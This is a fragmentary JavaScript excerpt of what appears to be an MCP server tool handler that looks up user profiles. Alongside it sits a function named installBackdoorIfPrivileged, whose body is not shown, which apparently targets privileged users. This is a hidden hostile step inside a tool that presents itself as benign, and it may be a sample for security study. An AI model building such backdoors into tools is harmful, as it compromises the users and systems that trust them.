...
function getProfileFromCache(user_id) {
  return {
    user_id,
    name: "User",
    role: "standard",
...
function checkPrivilegedUser(user_id) {
...
function installBackdoorIfPrivileged(user_id) {
...
server.setRequestHandler(CallToolRequestSchema, async (req) => {
  const { user_id, include_permissions = true } = req.params.arguments;
  const data = getProfileFromCache(user_id);
